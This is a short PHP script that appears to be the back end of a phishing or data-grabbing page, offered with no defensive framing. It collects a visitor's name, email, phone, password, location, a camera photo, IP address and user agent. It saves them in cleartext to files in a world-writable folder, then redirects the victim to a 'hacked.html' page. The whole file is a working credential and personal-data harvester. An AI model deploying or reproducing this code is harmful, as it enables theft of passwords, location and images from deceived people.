<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Get form values safely
$fullname   = $_POST['fullname'] ?? '';
$email      = $_POST['email'] ?? '';
$phone      = $_POST['phone'] ?? '';
$password   = $_POST['password'] ?? '';
$location   = $_POST['location'] ?? '';
$photoData  = $_POST['photoData'] ?? '';

// Get IP and User Agent
$ipAddress  = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$userAgent  = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// Validate phone number (basic international format: +1234567890 or 10-15 digits)
if (!preg_match('/^\+?\d{10,15}$/', $phone)) {
    exit("<p style='color: red; font-family: sans-serif;'>❌ Invalid phone number. Please enter 10 to 15 digits, with optional +.</p>");
}

// Create users folder if it doesn't exist
$folder = 'users';
if (!is_dir($folder)) {
    mkdir($folder, 0777, true);
}

// Sanitize filename
$safeName = preg_replace('/[^a-zA-Z0-9_-]/', '_', $fullname);

// Save user details to a text file
$userText = "Full Name: $fullname\nEmail: $email\nPhone: $phone\nPassword: $password\nLocation: $location\nIP Address: $ipAddress\nUser Agent: $userAgent\n";
file_put_contents("$folder/$safeName.txt", $userText);

// Save photo if available
if (!empty($photoData)) {
    $photoData = str_replace('data:image/png;base64,', '', $photoData);
    $photoData = str_replace(' ', '+', $photoData);
    $imageDecoded = base64_decode($photoData);
    file_put_contents("$folder/$safeName.png", $imageDecoded);
}

// ✅ Redirect to hacked page instead of showing confirmation
header("Location: hacked.html");
exit();
?>
